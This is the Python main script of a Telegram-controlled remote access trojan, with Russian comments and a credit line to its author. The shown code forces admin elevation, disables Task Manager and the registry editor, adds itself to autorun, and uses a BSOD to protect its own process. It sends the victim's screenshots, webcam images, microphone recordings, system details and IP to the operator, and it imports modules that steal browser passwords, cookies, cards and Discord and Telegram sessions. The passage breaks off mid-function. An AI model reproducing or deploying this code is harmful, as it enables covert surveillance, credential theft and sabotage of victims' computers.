###########################################
from config                        import *
###########################################
from func.Settings.Organization    import *
from func.Settings.Antivirus       import *
from func.Settings.Admin           import *
from func.Settings.CriticalProcess import *
from func.Settings.MessageBox      import *
###########################################
from func.Network.Information      import *
from func.Network.Location         import *
###########################################
from func.Main.Screen              import *
from func.Main.Webcam              import *
from func.Main.Audio               import *
from func.Main.Power               import *
from func.Main.Autorun             import *
###########################################
from func.Files.Tasklist           import *
from func.Files.Taskkill           import *
###########################################
from func.Fun.Message              import *
from func.Fun.Speak                import *
from func.Fun.OpenURL              import *
from func.Fun.Wallpapers           import *
###########################################
from func.Bomb.ZipBomb             import *
from func.Bomb.ForkBomb            import *
###########################################
from func.Stealer.Wifi             import *
from func.Stealer.FileZilla        import *
from func.Stealer.Discord          import *
from func.Stealer.Chromium         import *
from func.Stealer.Telegram         import *
###########################################
from func.Other.Clipboard          import *
from func.Other.Keylogger          import *
from func.Other.SendKeys           import *
from func.Other.Monitor            import *
from func.Other.Volume             import *
from func.Other.Rotate             import *
from func.Other.Freeze             import *
from func.Other.DVD                import *
###########################################
import telebot
############################################

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(bot, num_threads=50)

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/1\n<<')
button2 = telebot.types.KeyboardButton('/2\n>>')
button3 = telebot.types.KeyboardButton('/Screen\nüñº')
button4 = telebot.types.KeyboardButton('/Webcam\nüì∏')
button5 = telebot.types.KeyboardButton('/Audio\nüéô')
button6 = telebot.types.KeyboardButton('/Power\nüî¥')
button7 = telebot.types.KeyboardButton('/Autorun\nüîµ')
menu.row(button1, button3, button2)
menu.row(button4, button5)
menu.row(button6, button7)

main2 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('–ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è - üõë', callback_data='hibernate')
button2 = telebot.types.InlineKeyboardButton('–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã - ‚õîÔ∏è', callback_data='shutdown')
button3 = telebot.types.InlineKeyboardButton('–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ - ‚≠ïÔ∏è', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('–í—ã–π—Ç–∏ - üí¢', callback_data='logoff')
button5 = telebot.types.InlineKeyboardButton('BSOD - üåÄ', callback_data='bsod')
button6 = telebot.types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('–î–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É - üì•', callback_data='startup')
button2 = telebot.types.InlineKeyboardButton('–£–¥–∞–ª–∏—Ç—å - ‚ôªÔ∏è', callback_data='confirm')
button3 = telebot.types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å!', callback_data='uninstall')
button2 = telebot.types.InlineKeyboardButton('–û—Ç–º–µ–Ω–∞!', callback_data='cancel')
button3 = telebot.types.InlineKeyboardButton('¬´ –ù–∞–∑–∞–¥', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/3\n<<')
button2 = telebot.types.KeyboardButton('/4\n>>')
button3 = telebot.types.KeyboardButton('/Screen\nüñº')
button4 = telebot.types.KeyboardButton('/Files\nüíæ')
button5 = telebot.types.KeyboardButton('/Tasklist\nüìã')
button6 = telebot.types.KeyboardButton('/Taskkill\nüìù')
main5.row(button1, button3, button2)
main5.row(button4)
main5.row(button5, button6)

main6 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('–ó–∞–≤–µ—Ä—à–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã', callback_data='taskkill all')
button2 = telebot.types.InlineKeyboardButton('–û—Ç–∫–ª—é—á–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/CD\nüóÇ')
button2 = telebot.types.KeyboardButton('/Upload\nüì°')
button3 = telebot.types.KeyboardButton('/ls\nüìÑ')
button4 = telebot.types.KeyboardButton('/Remove\nüóë')
button5 = telebot.types.KeyboardButton('/Download\nüì®')
button6 = telebot.types.KeyboardButton('/Run\nüìå')
button7 = telebot.types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/5\n<<')
button2 = telebot.types.KeyboardButton('/6\n>>')
button3 = telebot.types.KeyboardButton('/Screen\nüñº')
button4 = telebot.types.KeyboardButton('/Message\nüí¨')
button5 = telebot.types.KeyboardButton('/Speak\nüì¢')
button6 = telebot.types.KeyboardButton('/OpenURL\nüåê')
button7 = telebot.types.KeyboardButton('/Wallpapers\nüß©')
main8.row(button1, button3, button2)
main8.row(button4, button5)
main8.row(button6, button7)


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã / help

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
	bot.send_message(command.chat.id,
		'·Ö†·Ö†·Ö†·Ö† ‚öôÔ∏è *–ö–æ–º–∞–Ω–¥—ã* ‚öôÔ∏è'
		'\n'
		'\n*/Info* - _–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö_'
		'\n*/Location* - _–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏_'
		'\n'
		'\n*/Screen* -  _–°–∫—Ä–∏–Ω—à–æ—Ç —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞_'
		'\n*/Webcam* - _–°–∫—Ä–∏–Ω—à–æ—Ç –≤–µ–±-–∫–∞–º–µ—Ä—ã_'
		'\n*/Audio* - _–ó–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞_'
		'\n*/Power* - _–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞_'
		'\n*/Autorun* - _–ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞_'
		'\n'
		'\n*/Files* - _–§–∞–π–ª –º–µ–Ω–µ–¥–∂–µ—Ä_'
		'\n‚Ä∫ */CD* - _–ò–∑–º–µ–Ω–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é_'
		'\n‚Ä∫ */ls* - _–°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤_'
		'\n‚Ä∫ */Remove* - _–£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª_'
		'\n‚Ä∫ */Upload* - _–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª_'
		'\n‚Ä∫ */Download* - _–°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª_'
		'\n‚Ä∫ */Run* - _–ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª_'
		'\n*/Tasklist* - _–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤_'
		'\n*/Taskkill* - _–ó–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å_'
		'\n'
		'\n*/Message* - _–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ_'
		'\n*/Speak* - _–û–∑–≤—É—á–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ_'
		'\n*/OpenURL* - _–û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É_'
		'\n*/Wallpapers* - _–ó–∞–º–µ–Ω–∏—Ç—å –æ–±–æ–∏_'
		'\n'
		'\n*/WiFi* - _Wi-Fi –¥–∞–Ω–Ω—ã–µ_'
		'\n*/FileZilla* - _FTP –∫–ª–∏–µ–Ω—Ç_'
		'\n*/Discord* - _Discord —Ç–æ–∫–µ–Ω_'
		'\n*/Telegram* - _Telegram —Å–µ—Å—Å–∏—è_'
		'\n*/CreditCards* - _–ü–æ–ª—É—á–∏—Ç—å –∫—Ä–µ–¥–∏—Ç–Ω—ã–µ –∫–∞—Ä—Ç—ã_'
		'\n*/Bookmarks* - _–ü–æ–ª—É—á–∏—Ç—å –∑–∞–∫–ª–∞–¥–∫–∏_'
		'\n*/Passwords* - _–ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏_'
		'\n*/Cookies* - _–ü–æ–ª—É—á–∏—Ç—å –∫—É–∫–∏_'
		'\n*/History* - _–ü–æ–ª—É—á–∏—Ç—å –∏—Å—Ç–æ—Ä–∏—é_'
		'\n'
		'\n*/ZipBomb* - _–ü–µ—Ä–µ–≥—Ä—É–∑–∫–∞ –ø–∞–º—è—Ç–∏_'
		'\n*/ForkBomb* - _–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º_'
		'\n'
		'\n*/Clipboard* - _–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞_'
		'\n*/Keylogger* - _–ü–æ–ª—É—á–∏—Ç—å –∫–µ–π–ª–æ–≥_'
		'\n*/SendKeys* - _–í–≤–µ—Å—Ç–∏ –∫–ª–∞–≤–∏—à–∏_'
		'\n*/Monitor* - _–í—ã–∫–ª—é—á–∏—Ç—å\–≤–∫–ª—é—á–∏—Ç—å –º–æ–Ω–∏—Ç–æ—Ä_'
		'\n*/Volume* - _–ò–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å_'
		'\n*/Rotate* - _–ü–µ—Ä–µ–≤–µ—Ä–Ω—É—Ç—å –º–æ–Ω–∏—Ç–æ—Ä_'
		'\n*/Freeze* - _–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤–≤–æ–¥_'
		'\n*/DVD* - _–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–∏—Å–∫–æ–≤–æ–¥–æ–º_'
		'\n'
		'\n*/CMD* - _–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ CMD_'
		'\n*/BAT* - _–ü–∞–∫–µ—Ç–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π_'
		'\n'
		'\n'
		'\n*by Prince | t.me/prince_soft üî•*', 
			reply_markup=menu, parse_mode='Markdown')

# –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞–ø–∫–∏ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]

RAT = [
	Directory,
	Directory + 'Documents',
	Directory + 'Photos'
	]

for Directories in RAT:

	if not os.path.exists(Directories):
		os.makedirs(Directories)


# –ó–∞–ø—É—Å–∫ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∞

if AdminRightsRequired is True:

	if Admin() is False:
		while True:
			try:
				print('[~] ‚Ä∫ –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –¥–æ —É—Ä–æ–≤–Ω—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n')
				os.startfile(CurrentPath, 'runas')
			except:
				pass
			else:
				print('[+] ‚Ä∫ ' + CurrentName + ' opened as admin rights\n')
				sys.exit()


# –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á

if DisableTaskManager is True:

	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
		print('[+] ‚Ä∫ taskmgr.exe —É–∂–µ –æ—Ç–∫–ª—é—á–µ–Ω\n')

	else:
		if Admin() is False:
			print('[-] ‚Ä∫ –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n')

		if Admin() is True:
			RegeditDisableTaskManager()
			open(Directory + 'RegeditDisableTaskManager', 'a').close()
			print('[+] ‚Ä∫ taskmgr.exe –±—ã–ª –æ—Ç–∫–ª—é—á–µ–Ω\n')


# –û—Ç–∫–ª—é—á–µ–Ω–∏–µ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ —Ä–µ–µ—Å—Ç—Ä–∞

if DisableRegistryTools is True:

	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
		print('[+] ‚Ä∫ regedit.exe —É–∂–µ –æ—Ç–∫–ª—é—á–µ–Ω\n')

	else:
		if Admin() is False:
			print('[-] ‚Ä∫ –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n')

		if Admin() is True:
			RegeditDisableRegistryTools()
			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
			print('[+] ‚Ä∫ regedit.exe –±—ã–ª –æ—Ç–∫–ª—é—á–µ–Ω\n')


# –î–æ–±–∞–≤–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–∞ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É

if AutorunEnabled is True:

	if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
		print('[+] ‚Ä∫ ' + CurrentName + ' ‚Äπ —É–∂–µ –∑–∞–ø—É—â–µ–Ω –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É ‚Ä∫ ' + InstallPath + ProcessName + '\n')

	else:
		if Admin() is False:
			print('[-] ‚Ä∫ –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n')

		if Admin() is True:
			AddToAutorun(AutorunName, InstallPath, ProcessName)

			if not os.path.exists(InstallPath + ProcessName):
				try:
					CopyToAutorun(CurrentPath, InstallPath, ProcessName)
				except:
					pass

			print('[+] ‚Ä∫ ' + CurrentName + ' ‚Äπ –±—ã–ª –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É ‚Ä∫ ' + InstallPath + ProcessName + '\n')


# –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω–µ

if DisplayMessageBox is True:

	if not os.path.exists(Directory + 'DisplayMessageBox'):
		open(Directory + 'DisplayMessageBox', 'a').close()
		MessageBox(Message)


# –ó–∞—â–∏—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ä–∞—Ç–∞ —Å –ø–æ–º–æ—â—å—é BSOD (–µ—Å–ª–∏ –µ–≥–æ –∑–∞–∫—Ä—ã–ª–∏)

if ProcessBSODProtectionEnabled is True:

	if Admin() is False:
		print('[-] ‚Ä∫ –î–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç—Å—è –ø—Ä–∞–≤–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n')

	if Admin() is True:
		if platform.release() == '10':
			Thread(target=ProcessChecker).start()

		if platform.release() != '10':
			SetProtection()

		print('[+] ‚Ä∫ –ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ –∑–∞—â–∏—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞\n')


# –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ —Ä–∞—Ç–∞

while True:
	try:

		if Admin() is True:
			Online = 'üëë –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!'

		if Admin() is False:
			Online = 'üíª –°–∫–ø—Ä–∏—Ç –∑–∞–ø—É—â–µ–Ω –±–µ–∑ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!'

		bot.send_message(TelegramChatID, 
			'\n*' + Online + '\n'
			'\nPC ¬ª ' + os.getlogin() +
			'\nOS ¬ª ' + Windows() +
			'\n'
			'\nAV ¬ª ' + Antivirus[0] +
			'\n'
			'\nIP ¬ª ' + Geolocation('query') + '*',
				parse_mode='Markdown')
		bot.send_message(TelegramChatID, 
		 	'–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø—Ä–∞–≤–∫–∏ –≤–≤–µ–¥–∏—Ç–µ /help')


	except Exception as e:
		print('[-] ‚Ä∫ –ü–æ–≤—Ç–æ—Ä–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ api.telegram.org\n')
		print(e)

	else:
		print('[+] ‚Ä∫ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ api.telegram.org\n')
		break


# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞

@bot.message_handler(regexp='/Screen')
def Screen(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Screenshot.jpg'

		Screenshot(File)
		Screen = open(File, 'rb')

		bot.send_photo(command.chat.id, Screen)

	except:
		pass


# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –≤–µ–±–∫–∏

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Webcam.jpg'

		if os.path.exists(File):
			os.remove(File)

		WebcamScreenshot(File)
		Webcam = open(File, 'rb')

		bot.send_photo(command.chat.id, Webcam)

	except:
		bot.reply_to(command, '_–í–µ–±-–∫–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞._', parse_mode='Markdown')


# –ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞

@bot.message_handler(regexp='/Audio')
def Audio(command):
	try:

		Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_–ó–∞–ø–∏—Å—å..._', parse_mode='Markdown')
		try:

			File = Directory + 'Audio.wav'

			Microphone(File, Seconds)
			Audio = open(File, 'rb')

			bot.send_voice(command.chat.id, Audio)

		except ValueError:
			bot.reply_to(command, '_–í—ã–±–µ—Ä–∏—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (—á–∏—Å–ª–æ)_', parse_mode='Markdown')

		except:
			bot.reply_to(command, '_Microphone not found._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–í—ã–±–µ—Ä–∏—Ç–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (–≤ —Å–µ–∫—É–Ω–¥–∞—Ö)_\n\n*‚Ä∫ /Audio*', parse_mode='Markdown')


# –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è

def SendMessage(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass


# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
	if command.message:


		# –ì–∏–±–µ—Ä–Ω–∞—Ü–∏—è

		if command.data == 'hibernate':
			SendMessage(command, '_–ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ –ø–µ—Ä–µ—Ö–æ–¥–∞ –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º!_')
			UnsetProtection()
			Hibernate()


		# –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã

		if command.data == 'shutdown':
			SendMessage(command, '*–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã*!')
			UnsetProtection()
			Shutdown()


		# –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫

		if command.data == 'restart':
			SendMessage(command, '*–ü–µ—Ä–µ–∑–∞–ø—É—Å–∫*!')
			UnsetProtection()
			Restart()


		# –í—ã—Ö–æ–¥ –∏–∑ —Å–∏—Å—Ç–µ–º—ã

		if command.data == 'logoff':
			SendMessage(command, '*–í—ã—Ö–æ–¥ –∏–∑ —Å–∏—Å—Ç–µ–º—ã*!')
			UnsetProtection()
			Logoff()


		# –ê–∫—Ç–∏–≤–∞—Ü–∏—è —Å–∏–Ω–µ–≥–æ —ç–∫—Ä–∞–Ω–∞ —Å–º–µ—Ä—Ç–∏

		if command.data == 'bsod':
			SendMessage(command, '–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω "–°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏"!')
			UnsetProtection()
			BSoD()


		# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏, –∫–æ—Ç–æ—Ä–∞—è –¥–æ–±–∞–≤–ª—è–µ—Ç —Ç—Ä–æ—è–Ω—Ü–∞ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É (schtasks)

		if command.data == 'startup':

			if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
				SendMessage(command, '*' + ProcessName + '* is already in startup.')

			else:

				if Admin() is False:
					SendMessage(command, '_This function requires admin rights._')

				if Admin() is True:
					AddToAutorun(AutorunName, InstallPath, ProcessName)

					if not os.path.exists(InstallPath + ProcessName):
						try:
							CopyToAutorun(CurrentPath, InstallPath, ProcessName)
						except:
							pass

					SendMessage(command, '*' + ProcessName + '* has been copied to startup!')


		# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—é—â–µ–π —É–¥–∞–ª–µ–Ω–∏–µ –≤–∏—Ä—É—Å–∞

		if command.data == 'confirm':
			bot.edit_message_text(chat_id=command.message.chat.id,
				message_id=command.message.message_id, text='_Are you sure?_', reply_markup=main4, parse_mode='Markdown')


		# –†–∞–±–æ—Ç–∞ —Å –∫–Ω–æ–ø–∫–æ–π <<–£–¥–∞–ª–∏—Ç—å>>

		if command.data == 'uninstall':
			SendMessage(command, '*' + CurrentName + '* has been uninstalled!')
			Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory)


		# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏ <<–ó–∞–≤–µ—Ä—à–∏—Ç—å –≤—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã>>

		if command.data == 'taskkill all':
			SendMessage(command, '_Terminating processes..._')
			TaskkillAll(CurrentName)
			SendMessage(command, '_All processes has been terminated!_')


		# –†–∞–±–æ—Ç–∞ —Å –∫–Ω–æ–ø–∫–æ–π <<–û—Ç–∫–ª—é—á–∏—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á>>

		if command.data == 'disabletaskmgr':

			if os.path.exists(Directory + 'RegeditDisableTaskManager'):
				SendMessage(command, '*taskmgr.exe* is already disabled.')

			else:

				if Admin() is False:
					SendMessage(command, '_This function requires admin rights._')

				if Admin() is True:
					RegeditDisableTaskManager()
					open(Directory + 'RegeditDisableTaskManager', 'a').close()
					SendMessage(command, '*taskmgr.exe* has been disabled!')


		# –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–Ω–æ–ø–∫–æ–π <<–ù–∞–∑–∞–¥>>

		if command.data == 'cancel':
			SendMessage(command, '`...`')


# –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–π—Ç–µ –∫–∞—Ç–∞–ª–æ–≥–∏ –∏ –ø–µ—Ä–µ–∫–ª—é—á–∞–π—Ç–µ—Å—å –º–µ–∂–¥—É –Ω–∏–º–∏

@bot.message_handler(regexp='/CD')
def CD(command):
	try:

		Path = re.split('/CD ', command.text, flags=re.I)[1]
		os.chdir(Path)
		bot.send_message(command.chat.id, '_–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∏–∑–º–µ–Ω–µ–Ω–∞!_\n\n`' + os.getcwd() + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è_\n\n`' + os.getcwd() + '`\n\n_–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è_\n\n`' + os.getlogin() + '`', parse_mode='Markdown')


# –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∏–∑ –∫–∞—Ç–∞–ª–æ–≥–∞

@bot.message_handler(regexp='/ls')
def ls(command):
	try:

		Dirs = '\n``'.join(os.listdir())
		bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')

	except:
		try:

			Dirse = '\n'.join(os.listdir())
			SplittedText = telebot.util.split_string(Dirse, 4096)
			for Dirse in SplittedText:
				bot.send_message(command.chat.id, '`' + Dirse + '`', parse_mode='Markdown')

		except PermissionError:
				bot.reply_to(command, '_–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞._', parse_mode='Markdown')


# –£–¥–∞–ª—è–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Ñ–∞–π–ª

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
	try:

		File = re.split('/Remove ', command.text, flags=re.I)[1]
		Created = os.path.getctime(os.getcwd() + '\\' + File)
		Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]

		def ConvertBytes(num):
			for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
				if num < 1024.0:
					return '%3.1f %s' % (num, x)
				num /= 1024.0

		def FileSize(FilePath):
			if os.path.isfile(FilePath):
				FileInfo = os.stat(FilePath)
				return ConvertBytes(FileInfo.st_size)

		bot.send_message(command.chat.id, 
			'File *' + File + '* —É–¥–∞–ª–µ–Ω!' 
			'\n' 
			'\n*Created* ¬ª `%02d/%02d/%d'%(Day, Month, Year) + '`' +
			'\n*Size* ¬ª `' + FileSize(os.getcwd() + '\\' + File) + '`',
				parse_mode='Markdown')

		os.remove(os.getcwd() + '\\' + File)

	except:
		try:

			File = re.split('/Remove ', command.text, flags=re.I)[1]
			Created = os.path.getctime(os.getcwd() + '\\' + File)
			Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]
			Folder = os.getcwd() + '\\' + File
			FolderSize = 0

			for (Path, Dirs, Files) in os.walk(Folder):
				for iFile in Files:
					FileName = os.path.join(Path, iFile)
					FolderSize += os.path.getsize(FileName)
			Files = Folders = 0

			for _, DirNames, FileNames in os.walk(os.getcwd() + '\\' + File):
				Files += len(FileNames)
				Folders += len(DirNames)

			shutil.rmtree(os.getcwd() + '\\' + File)

			bot.send_message(command.chat.id, 
				'Folder *' + File + '* —É–¥–∞–ª–µ–Ω!'
				'\n'
				'\n*Created* ¬ª `%02d/%02d/%d'%(Day, Month, Year) + '`' +
